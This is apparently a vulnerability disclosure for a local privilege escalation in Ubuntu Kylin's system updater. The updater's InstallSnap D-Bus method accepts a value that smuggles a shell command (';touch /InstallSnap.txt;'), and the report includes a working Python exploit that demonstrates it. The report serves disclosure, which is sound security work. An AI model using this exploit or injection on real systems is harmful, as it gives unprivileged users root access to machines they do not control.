# UbuntuKylin OS privilege escalation vulnerability

Author: cn-lwj（cn_lwj@163.com）\
Unit: Ubuntukylin.（https://www.ubuntukylin.com/index-en.html）

## Report
### Describe
There is a command injection vulnerability in the InstallSnap function in the update component (Kylin-system-updater) of the Ubuntu Kylin OS system. Any user can call the vulnerability, causing ordinary users to obtain root privileges through the vulnerability.

### Hazard level
High
### Affected version
- Ubuntukylin：kylin-system-updater <= 1.4.20kord

### POC&&EXP
ISO Download:\
https://www.ubuntukylin.com/downloads/download.php?id=91

exp.py
```
import dbus
import os

payload  = ';touch /InstallSnap.txt;'
bus=dbus.SystemBus()
xattr=bus.get_object('com.kylin.systemupgrade','/com/kylin/systemupgrade')
iface=dbus.Interface(xattr,dbus_interface='com.kylin.systemupgrade.interface')
prop=iface.InstallSnap("{}".format(payload))
print(prop)
os.system("ls -l /InstallSnap.txt")
```

### example
![1.png](../imgs/1.png)
